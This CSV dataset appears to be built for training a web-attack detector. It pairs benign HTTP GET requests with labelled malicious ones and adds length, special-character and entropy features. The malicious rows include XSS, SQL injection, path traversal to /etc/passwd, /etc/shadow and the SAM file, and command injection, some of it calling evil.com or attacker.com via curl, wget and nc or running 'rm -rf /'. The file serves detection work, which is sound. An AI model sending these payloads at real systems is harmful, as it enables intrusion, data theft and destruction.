payload,label,length,special_ratio,entropy
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /post?q=<script>alert('XSS')</script> HTTP/1.1,1,50.0,0.16,4.688367439558378
GET /settings?price=100 HTTP/1.1,0,32.0,0.0,4.265319531114783
GET /post?q=<script>document.location='http://evil.com'</script> HTTP/1.1,1,73.0,0.0821917808219178,4.7275633481374975
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /search?color=blue&filter=active HTTP/1.1,0,45.0,0.022222222222222223,4.5358630961373665
GET /image?file=....//....//....//etc/passwd HTTP/1.1,1,53.0,0.0,3.913867315824671
GET /register?size=medium&q=search+term&sort=name HTTP/1.1,0,58.0,0.034482758620689655,4.542796944481125
GET /document?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1,1,63.0,0.0,4.530275805107375
GET /settings?page=1&id=123&filter=active HTTP/1.1,0,50.0,0.04,4.573660689688187
GET /profile?user=') OR ('1'='1 HTTP/1.1,1,40.0,0.15,4.403055907333275
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /api/users?limit=10&filter=active HTTP/1.1,0,46.0,0.021739130434782608,4.493473304203661
GET /comment?q=%3Cvideo%3E%3Csource onerror='alert(1)'%3E HTTP/1.1,1,66.0,0.06060606060606061,4.743659703722633
GET /profile?size=medium&limit=10&page=1 HTTP/1.1,0,49.0,0.04081632653061224,4.556050599606489
GET /search?q=%3Cimg src=x onerror=alert('XSS')%3E HTTP/1.1,1,59.0,0.06779661016949153,4.869516989856459
GET /search?user=' OR '1'='1'/* HTTP/1.1,1,40.0,0.125,4.193942707918268
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /docs?page=1 HTTP/1.1,0,25.0,0.0,4.103465189601645
GET /post?q=<svg onload=alert('XSS')> HTTP/1.1,1,46.0,0.13043478260869565,4.822156249394176
GET /profile?category=electronics HTTP/1.1,0,42.0,0.0,4.463280517810811
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /login?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,53.0,0.05660377358490566,4.822747464920989
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /comment?q=<video><source onerror='alert(1)'> HTTP/1.1,1,58.0,0.13793103448275862,4.701195065303421
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /profile?user=' OR '1'='1 HTTP/1.1,1,38.0,0.10526315789473684,4.280693631807705
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /command?cmd=hostname| whoami HTTP/1.1,1,42.0,0.023809523809523808,4.377336696990887
GET /file?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,52.0,0.1346153846153846,3.9453055682456224
GET /profile?id=123&price=100 HTTP/1.1,0,38.0,0.02631578947368421,4.418722908066561
GET /profile?category=electronics HTTP/1.1,0,42.0,0.0,4.463280517810811
GET /products.html?id=123&limit=10&category=electronics HTTP/1.1,0,64.0,0.03125,4.7790786642591
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /comment?q=%3Cinput onfocus=alert(1) autofocus%3E HTTP/1.1,1,62.0,0.03225806451612903,4.750499689691863
GET /index.html?price=100&filter=active&q=search+term HTTP/1.1,0,62.0,0.03225806451612903,4.719852358564602
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /exec?cmd=hostname$(cat /etc/passwd) HTTP/1.1,1,49.0,0.061224489795918366,4.5172723438944455
GET /api/users?category=electronics&color=blue HTTP/1.1,0,55.0,0.01818181818181818,4.533556250195737
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /exec?cmd=hostname& cat /etc/passwd HTTP/1.1,1,48.0,0.020833333333333332,4.3970552088742005
GET /search?q=%3Cbody onload=alert('XSS')%3E HTTP/1.1,1,53.0,0.07547169811320754,4.9162308317584085
GET /api/user?user=' OR '1'='1' -- HTTP/1.1,1,43.0,0.11627906976744186,4.200007639511387
GET /index.html?color=blue&q=search+term&filter=active HTTP/1.1,0,63.0,0.031746031746031744,4.762528732817682
GET /file?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1,1,59.0,0.0,4.33753695684099
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /download?file=..%c0%af..%c0%af..%c0%afetc/passwd HTTP/1.1,1,62.0,0.0,4.409189053260732
"GET /api/user?user=' AND 1=CONVERT(int, (SELECT @@version))-- HTTP/1.1",1,70.0,0.07142857142857142,4.9628724384914715
GET /api/users?limit=10&color=blue&page=1 HTTP/1.1,0,50.0,0.04,4.593269689515109
GET /register?category=electronics&price=100&page=1 HTTP/1.1,0,60.0,0.03333333333333333,4.456297888280895
GET /register?limit=10&filter=active&color=blue HTTP/1.1,0,56.0,0.03571428571428571,4.530855931783248
GET /api/products?color=blue&page=1 HTTP/1.1,0,44.0,0.022727272727272728,4.555467129755083
GET /api/user?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,56.0,0.05357142857142857,4.758621780036169
GET /file?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,52.0,0.1346153846153846,3.9453055682456224
GET /post?q=<body onload=alert('XSS')> HTTP/1.1,1,47.0,0.1276595744680851,4.799061723926001
GET /settings?limit=10&sort=name&q=search+term HTTP/1.1,0,55.0,0.03636363636363636,4.578833068298883
GET /api/users?sort=name&category=electronics&id=123 HTTP/1.1,0,61.0,0.03278688524590164,4.678218845859474
GET /post?q=<select onfocus=alert(1) autofocus> HTTP/1.1,1,56.0,0.07142857142857142,4.5683535294637805
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /api/user?user=' UNION SELECT * FROM users-- HTTP/1.1,1,57.0,0.017543859649122806,4.649979102494203
"GET /api/user?user=' AND 1=CONVERT(int, (SELECT @@version))-- HTTP/1.1",1,70.0,0.07142857142857142,4.9628724384914715
GET /file?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,51.0,0.0,4.355537901604238
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /settings?sort=name&page=1 HTTP/1.1,0,39.0,0.02564102564102564,4.368108949354111
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /exec?cmd=hostname| whoami HTTP/1.1,1,39.0,0.02564102564102564,4.490029141717277
GET /search?user=1%27%20AND%20%271%27=%271 HTTP/1.1,1,51.0,0.0,4.311953224613571
GET /docs?category=electronics&id=123&limit=10 HTTP/1.1,0,55.0,0.03636363636363636,4.658188122418888
GET /image?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,52.0,0.0,4.4473385747039735
GET /image?file=..\..\..\windows\system32\config\sam HTTP/1.1,1,61.0,0.09836065573770492,4.563099272559269
GET /document?file=..//..//..//etc/passwd HTTP/1.1,1,50.0,0.0,4.250044500340504
GET /search?q=%3Caudio src=x onerror=alert(1)%3E HTTP/1.1,1,57.0,0.03508771929824561,4.709397031404954
GET /search?user=1' AND '1'='2 HTTP/1.1,1,39.0,0.10256410256410256,4.291687154704211
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /settings?limit=10 HTTP/1.1,0,31.0,0.0,4.147114052043201
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /profile?user=' OR '1'='1'/* HTTP/1.1,1,41.0,0.12195121951219512,4.305858944160431
GET /products.html?page=1&limit=10&size=medium HTTP/1.1,0,55.0,0.03636363636363636,4.671913349730952
GET /image?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,53.0,0.1320754716981132,4.043637892401607
GET /login?price=100&page=1 HTTP/1.1,0,36.0,0.027777777777777776,4.371178126382215
GET /profile?limit=10 HTTP/1.1,0,30.0,0.0,4.231401845392171
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /exec?cmd=hostname| curl http://evil.com HTTP/1.1,1,53.0,0.018867924528301886,4.66632304878036
GET /products.html?price=100 HTTP/1.1,0,37.0,0.0,4.519999987133628
GET /register?price=100&page=1&q=search+term HTTP/1.1,0,53.0,0.03773584905660377,4.470765917146394
GET /document?file=..%c0%af..%c0%af..%c0%afetc/passwd HTTP/1.1,1,62.0,0.0,4.47370518229299
GET /about.html?id=123&size=medium HTTP/1.1,0,43.0,0.023255813953488372,4.61185661496596
GET /api/user?user=%27%20UNION%20SELECT%20*%20FROM%20users-- HTTP/1.1,1,69.0,0.0,4.769341442373704
GET /index.html?sort=name HTTP/1.1,0,34.0,0.0,4.477024973539649
GET /profile?user=' OR '1'='1 HTTP/1.1,1,38.0,0.10526315789473684,4.280693631807705
GET /search?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,54.0,0.05555555555555555,4.755365864181302
GET /profile?limit=10&id=123 HTTP/1.1,0,37.0,0.02702702702702703,4.432294243948857
GET /run?cmd=hostname`wget http://evil.com/malware` HTTP/1.1,1,60.0,0.03333333333333333,4.742318879259732
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /blog?category=electronics HTTP/1.1,0,39.0,0.0,4.438747090435226
GET /ping?cmd=hostname; rm -rf / HTTP/1.1,1,41.0,0.024390243902439025,4.580129980693029
GET /run?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,48.0,0.041666666666666664,4.4803885422075345
"GET /api/user?user=%27%20AND%201=CONVERT(int,%20(SELECT%20@@version))-- HTTP/1.1",1,80.0,0.05,5.079950014433722
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /command?cmd=hostname| curl http://evil.com HTTP/1.1,1,56.0,0.017857142857142856,4.6310280831124775
GET /docs?q=search+term&size=medium&limit=10 HTTP/1.1,0,53.0,0.03773584905660377,4.652079888362182
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /api/products?page=1 HTTP/1.1,0,33.0,0.0,4.346831997884095
GET /api/user?user=' OR '1'='1 HTTP/1.1,1,39.0,0.10256410256410256,4.169766962341045
GET /ping?cmd=hostname$(cat /etc/passwd) HTTP/1.1,1,49.0,0.061224489795918366,4.624315456095191
GET /search?price=100&color=blue&category=electronics HTTP/1.1,0,62.0,0.03225806451612903,4.57276501213293
GET /login?sort=name HTTP/1.1,0,29.0,0.0,4.349191770915039
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /exec?cmd=hostname; ping -c 10 127.0.0.1 HTTP/1.1,1,53.0,0.018867924528301886,4.59322299253645
GET /products.html?id=123 HTTP/1.1,0,34.0,0.0,4.51364592935837
GET /contact.html?category=electronics&filter=active HTTP/1.1,0,61.0,0.01639344262295082,4.499586108937512
GET /document?file=../../../etc/passwd HTTP/1.1,1,47.0,0.0,4.348822160974294
GET /api/users?color=blue&price=100&page=1 HTTP/1.1,0,51.0,0.0392156862745098,4.500377547641745
GET /search?user=' OR '1'='1' -- HTTP/1.1,1,41.0,0.12195121951219512,4.187450335080594
GET /search?user=admin%27%20-- HTTP/1.1,1,39.0,0.0,4.650661513678569
GET /comment?q=<body onload=alert('XSS')> HTTP/1.1,1,50.0,0.12,4.813660689688186
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /profile?sort=name HTTP/1.1,0,31.0,0.0,4.413716068381602
GET /file?file=..%c0%af..%c0%af..%c0%afetc/passwd HTTP/1.1,1,58.0,0.0,4.27538703061342
GET /comment?q=<script>document.location='http://evil.com'</script> HTTP/1.1,1,76.0,0.07894736842105263,4.719572540832782
GET /profile?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,56.0,0.10714285714285714,4.833616975397235
GET /login?user=' OR 1=1 -- HTTP/1.1,1,36.0,0.027777777777777776,4.326465890981192
GET /profile?user=' OR 'a'='a HTTP/1.1,1,38.0,0.10526315789473684,4.385956789702441
GET /file?file=../../../etc/passwd HTTP/1.1,1,43.0,0.0,4.108333720677514
GET /profile?q=<select onfocus=alert(1) autofocus> HTTP/1.1,1,59.0,0.06779661016949153,4.634359312213627
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /dashboard?page=1&id=123&sort=name HTTP/1.1,0,47.0,0.0425531914893617,4.612787521752311
GET /index.html?price=100&size=medium HTTP/1.1,0,46.0,0.021739130434782608,4.604764945046351
GET /search?filter=active&id=123 HTTP/1.1,0,41.0,0.024390243902439025,4.552197126358232
GET /settings?price=100 HTTP/1.1,0,32.0,0.0,4.265319531114783
GET /api/products?price=100&color=blue&q=search+term HTTP/1.1,0,61.0,0.03278688524590164,4.7153444607199715
GET /login?category=electronics&q=search+term&filter=active HTTP/1.1,0,68.0,0.029411764705882353,4.613126909066061
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /settings?page=1&id=123 HTTP/1.1,0,36.0,0.027777777777777776,4.371178126382215
GET /login?page=1&size=medium HTTP/1.1,0,38.0,0.02631578947368421,4.4842551447948
GET /document?file=../../../../../../etc/passwd HTTP/1.1,1,56.0,0.0,4.0547689157515
GET /products.html?filter=active HTTP/1.1,0,41.0,0.0,4.607432797248243
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /command?cmd=hostname; sleep 10 HTTP/1.1,1,44.0,0.022727272727272728,4.453416561671605
GET /search?sort=name&color=blue&filter=active HTTP/1.1,0,55.0,0.03636363636363636,4.601471477350457
GET /settings?color=blue HTTP/1.1,0,33.0,0.0,4.4154581344444095
GET /run?cmd=hostname; ls -la HTTP/1.1,1,38.0,0.02631578947368421,4.543851526544547
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /login?user=' OR 'a'='a HTTP/1.1,1,36.0,0.1111111111111111,4.3711781263822145
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /contact.html?category=electronics HTTP/1.1,0,47.0,0.0,4.416632607946488
GET /docs?category=electronics&limit=10 HTTP/1.1,0,48.0,0.020833333333333332,4.573934896284058
GET /ping?cmd=hostname| nc attacker.com 4444 HTTP/1.1,1,53.0,0.018867924528301886,4.569730303898026
GET /search?q=<svg onload=alert('XSS')> HTTP/1.1,1,48.0,0.125,4.871115365169274
GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,55.0,0.0,4.487518632456837
GET /dashboard?sort=name HTTP/1.1,0,33.0,0.0,4.331976694984911
GET /about.html?limit=10&size=medium&page=1 HTTP/1.1,0,52.0,0.038461538461538464,4.603909910282365
GET /blog?size=medium&category=electronics&limit=10 HTTP/1.1,0,60.0,0.03333333333333333,4.685917579505496
GET /docs?q=search+term&size=medium HTTP/1.1,0,44.0,0.022727272727272728,4.589780198035242
GET /image?file=..;/..;/..;/etc/passwd HTTP/1.1,1,47.0,0.06382978723404255,4.290207533268688
GET /profile?user=%27%20OR%20%27a%27=%27a HTTP/1.1,1,50.0,0.0,4.448367439558377
"GET /profile?user=' UNION ALL SELECT NULL,NULL-- HTTP/1.1",1,57.0,0.017543859649122806,4.593047304286545
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /docs?size=medium&id=123&price=100 HTTP/1.1,0,47.0,0.0425531914893617,4.511619702557343
GET /profile?user=' UNION SELECT NULL-- HTTP/1.1,1,48.0,0.020833333333333332,4.629247855285173
GET /search?q=%3Cimg src=x onerror=alert('XSS')%3E HTTP/1.1,1,59.0,0.06779661016949153,4.869516989856459
GET /profile?user=') OR ('1'='1 HTTP/1.1,1,40.0,0.15,4.403055907333275
GET /api/users?filter=active&size=medium&category=electronics HTTP/1.1,0,70.0,0.02857142857142857,4.636006945330954
GET /api/users?q=search+term HTTP/1.1,0,37.0,0.0,4.404738838309562
GET /comment?q=<textarea onfocus=alert(1) autofocus> HTTP/1.1,1,61.0,0.06557377049180328,4.615346666128008
GET /search?user=' OR 'a'='a HTTP/1.1,1,37.0,0.10810810810810811,4.195675662809304
GET /dashboard?sort=name&color=blue HTTP/1.1,0,44.0,0.022727272727272728,4.544325652580697
GET /settings?limit=10 HTTP/1.1,0,31.0,0.0,4.147114052043201
GET /download?file=..%c0%af..%c0%af..%c0%afetc/passwd HTTP/1.1,1,62.0,0.0,4.409189053260732
GET /search?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,55.0,0.10909090909090909,4.803642667873433
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /settings?filter=active&size=medium HTTP/1.1,0,48.0,0.020833333333333332,4.528107168362811
GET /comment?q=<video><source onerror='alert(1)'> HTTP/1.1,1,58.0,0.13793103448275862,4.701195065303421
GET /profile?user='; DROP TABLE users-- HTTP/1.1,1,48.0,0.041666666666666664,4.629247855285172
GET /search?page=1&category=electronics HTTP/1.1,0,48.0,0.020833333333333332,4.488521032323435
GET /about.html?size=medium&price=100 HTTP/1.1,0,46.0,0.021739130434782608,4.702378531908808
GET /api/users?sort=name&price=100 HTTP/1.1,0,43.0,0.023255813953488372,4.483722312539753
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /search?category=electronics HTTP/1.1,0,41.0,0.0,4.393898955732062
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /dashboard?size=medium&page=1&color=blue HTTP/1.1,0,53.0,0.03773584905660377,4.661329416582428
GET /index.html?page=1 HTTP/1.1,0,31.0,0.0,4.389364858634393
GET /command?cmd=hostname& cat /etc/passwd HTTP/1.1,1,51.0,0.0196078431372549,4.358316518272401
GET /blog?q=search+term HTTP/1.1,0,32.0,0.0,4.538909765557392
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /profile?user=' OR 1=1 -- HTTP/1.1,1,38.0,0.02631578947368421,4.343597829848841
GET /api/users?page=1&size=medium HTTP/1.1,0,42.0,0.023809523809523808,4.350068910616443
GET /api/users?size=medium&page=1&limit=10 HTTP/1.1,0,51.0,0.0392156862745098,4.468815969711612
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /about.html?color=blue&limit=10&size=medium HTTP/1.1,0,56.0,0.03571428571428571,4.605851127144314
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /index.html?size=medium&id=123 HTTP/1.1,0,43.0,0.023255813953488372,4.50127783584588
GET /search?page=1 HTTP/1.1,0,27.0,0.0,4.106377316818028
GET /register?price=100 HTTP/1.1,0,32.0,0.0,4.155639062229566
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /run?cmd=hostname& cat /etc/passwd HTTP/1.1,1,47.0,0.02127659574468085,4.4955582663410985
GET /command?cmd=hostname; sleep 10 HTTP/1.1,1,44.0,0.022727272727272728,4.453416561671605
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /file?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,52.0,0.1346153846153846,3.9453055682456224
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /api/users?sort=name HTTP/1.1,0,33.0,0.0,4.309101316131472
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
"GET /api/user?user=' UNION ALL SELECT NULL,NULL-- HTTP/1.1",1,58.0,0.017241379310344827,4.523051306072045
GET /run?cmd=hostname| curl http://evil.com HTTP/1.1,1,52.0,0.019230769230769232,4.68083298720544
GET /post?q=javascript:alert('XSS') HTTP/1.1,1,44.0,0.09090909090909091,4.771598379853423
GET /search?user=' OR '1'='1' -- HTTP/1.1,1,41.0,0.12195121951219512,4.187450335080594
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /api/user?user=%27%20UNION%20SELECT%20NULL-- HTTP/1.1,1,57.0,0.0,4.714040233273208
GET /comment?q=<img src='x' onerror='alert(1)'> HTTP/1.1,1,56.0,0.14285714285714285,4.662016252639434
GET /comment?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,54.0,0.07407407407407407,4.6691617524766045
GET /search?user=' OR '1'='1'/* HTTP/1.1,1,40.0,0.125,4.193942707918268
GET /blog?q=search+term&color=blue&size=medium HTTP/1.1,0,55.0,0.03636363636363636,4.72428761375343
GET /about.html?category=electronics HTTP/1.1,0,45.0,0.0,4.580307540581811
GET /api/products?filter=active&category=electronics HTTP/1.1,0,61.0,0.01639344262295082,4.588959117366748
GET /index.html?id=123&category=electronics HTTP/1.1,0,52.0,0.019230769230769232,4.74323899677922
GET /profile?user=1' AND '1'='2 HTTP/1.1,1,40.0,0.1,4.403055907333275
GET /file?file=..\..\..\windows\system32\config\sam HTTP/1.1,1,60.0,0.1,4.549791896188175
GET /profile?size=medium&price=100&id=123 HTTP/1.1,0,50.0,0.04,4.58146788019945
GET /index.html?category=electronics HTTP/1.1,0,45.0,0.0,4.5970828184076655
GET /api/users?page=1 HTTP/1.1,0,30.0,0.0,4.0980685120588385
GET /search?user=' OR '1'='1' -- HTTP/1.1,1,41.0,0.12195121951219512,4.187450335080594
GET /profile?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,56.0,0.10714285714285714,4.833616975397235
GET /contact.html?page=1 HTTP/1.1,0,33.0,0.0,4.309101316131472
GET /register?size=medium&color=blue&q=search+term HTTP/1.1,0,59.0,0.03389830508474576,4.644752160554086
GET /post?q=<script>alert(document.cookie)</script> HTTP/1.1,1,60.0,0.1,4.7253263791155
GET /login?user='; DROP TABLE users-- HTTP/1.1,1,46.0,0.043478260869565216,4.6460722174352656
GET /docs?id=123&sort=name&q=search+term HTTP/1.1,0,49.0,0.04081632653061224,4.665131782625804
GET /docs?q=search+term&color=blue&category=electronics HTTP/1.1,0,64.0,0.03125,4.624792680182113
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /register?id=123&filter=active&sort=name HTTP/1.1,0,53.0,0.03773584905660377,4.598216624734382
GET /blog?color=blue&limit=10 HTTP/1.1,0,38.0,0.02631578947368421,4.398857447483312
GET /contact.html?size=medium&color=blue&id=123 HTTP/1.1,0,56.0,0.03571428571428571,4.743982153814128
GET /about.html?q=search+term&page=1 HTTP/1.1,0,45.0,0.022222222222222223,4.6524211516448455
GET /post?q=<script>alert(document.cookie)</script> HTTP/1.1,1,60.0,0.1,4.7253263791155
GET /api/users?filter=active&id=123 HTTP/1.1,0,44.0,0.022727272727272728,4.572623663895163
GET /api/user?user=admin%27/* HTTP/1.1,1,38.0,0.0,4.491219947597179
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /profile?q=%3Cbody onload=alert('XSS')%3E HTTP/1.1,1,54.0,0.07407407407407407,4.898134492784018
GET /dashboard?page=1 HTTP/1.1,0,30.0,0.0,4.231401845392172
GET /download?file=../../../etc/passwd HTTP/1.1,1,47.0,0.0,4.263715777995571
GET /login?user=%27%20OR%201=1%20-- HTTP/1.1,1,44.0,0.0,4.516027641266231
GET /products.html?id=123&q=search+term HTTP/1.1,0,48.0,0.020833333333333332,4.772055208874202
GET /comment?q=<script>alert('XSS')</script> HTTP/1.1,1,53.0,0.1509433962264151,4.803023284588598
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /index.html?category=electronics&limit=10 HTTP/1.1,0,54.0,0.018518518518518517,4.6619328723735824
GET /command?cmd=hostname$(cat /etc/passwd) HTTP/1.1,1,52.0,0.057692307692307696,4.474008227548451
GET /api/users?filter=active&limit=10&size=medium HTTP/1.1,0,58.0,0.034482758620689655,4.5382337978174965
GET /contact.html?price=100&q=search+term&sort=name HTTP/1.1,0,60.0,0.03333333333333333,4.617155962520949
GET /exec?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,49.0,0.04081632653061224,4.38481877255418
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /comment?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1,1,71.0,0.028169014084507043,4.773006190464478
GET /run?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,48.0,0.041666666666666664,4.4803885422075345
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /exec?cmd=hostname; ping -c 10 127.0.0.1 HTTP/1.1,1,53.0,0.018867924528301886,4.59322299253645
GET /index.html?q=search+term&sort=name&color=blue HTTP/1.1,0,59.0,0.03389830508474576,4.727745329236117
GET /index.html?page=1&price=100&size=medium HTTP/1.1,0,53.0,0.03773584905660377,4.67368832284759
GET /api/user?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,56.0,0.05357142857142857,4.758621780036169
GET /contact.html?color=blue&filter=active HTTP/1.1,0,51.0,0.0196078431372549,4.537635087443512
GET /login?limit=10&q=search+term HTTP/1.1,0,42.0,0.023809523809523808,4.671730220243275
GET /comment?q=<input onfocus=alert(1) autofocus> HTTP/1.1,1,58.0,0.06896551724137931,4.674719090246699
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /about.html?page=1 HTTP/1.1,0,31.0,0.0,4.324848729602135
GET /register?id=123&color=blue HTTP/1.1,0,40.0,0.025,4.546439344671016
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /login?price=100 HTTP/1.1,0,29.0,0.0,4.254195650150781
GET /post?q=<svg onload=alert('XSS')> HTTP/1.1,1,46.0,0.13043478260869565,4.822156249394176
GET /login?category=electronics&limit=10 HTTP/1.1,0,49.0,0.02040816326530612,4.527276935642876
GET /command?cmd=hostname`wget http://evil.com/malware` HTTP/1.1,1,64.0,0.03125,4.654078664259099
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /docs?sort=name&color=blue&price=100 HTTP/1.1,0,49.0,0.04081632653061224,4.624315456095191
GET /dashboard?size=medium HTTP/1.1,0,35.0,0.0,4.400432302535624
GET /settings?id=123&limit=10&category=electronics HTTP/1.1,0,59.0,0.03389830508474576,4.624357778895272
GET /api/user?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,56.0,0.05357142857142857,4.758621780036169
GET /products.html?category=electronics HTTP/1.1,0,48.0,0.0,4.6053885422075345
GET /profile?sort=name HTTP/1.1,0,31.0,0.0,4.413716068381602
GET /ping?cmd=hostname`id` HTTP/1.1,1,35.0,0.05714285714285714,4.536286231168866
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /search?user=' OR '1'='1'/* HTTP/1.1,1,40.0,0.125,4.193942707918268
GET /search?user='; DROP TABLE users-- HTTP/1.1,1,47.0,0.0425531914893617,4.509494905320962
GET /ping?cmd=hostname$(whoami) HTTP/1.1,1,40.0,0.075,4.684183719779188
GET /register?price=100&filter=active HTTP/1.1,0,46.0,0.021739130434782608,4.395859717341203
GET /about.html?page=1&price=100 HTTP/1.1,0,41.0,0.024390243902439025,4.607432797248243
GET /run?cmd=hostname; rm -rf / HTTP/1.1,1,40.0,0.025,4.456198332810094
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /register?id=123 HTTP/1.1,0,29.0,0.0,4.1852301329094015
GET /search?price=100&category=electronics HTTP/1.1,0,51.0,0.0196078431372549,4.520875225242075
GET /login?price=100&sort=name HTTP/1.1,0,39.0,0.02564102564102564,4.580023372597455
GET /profile?price=100&limit=10 HTTP/1.1,0,40.0,0.025,4.334183719779189
GET /post?q=<video><source onerror='alert(1)'> HTTP/1.1,1,55.0,0.14545454545454545,4.699833468881675
GET /login?filter=active&price=100&limit=10 HTTP/1.1,0,52.0,0.038461538461538464,4.507380102423636
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /settings?color=blue HTTP/1.1,0,33.0,0.0,4.4154581344444095
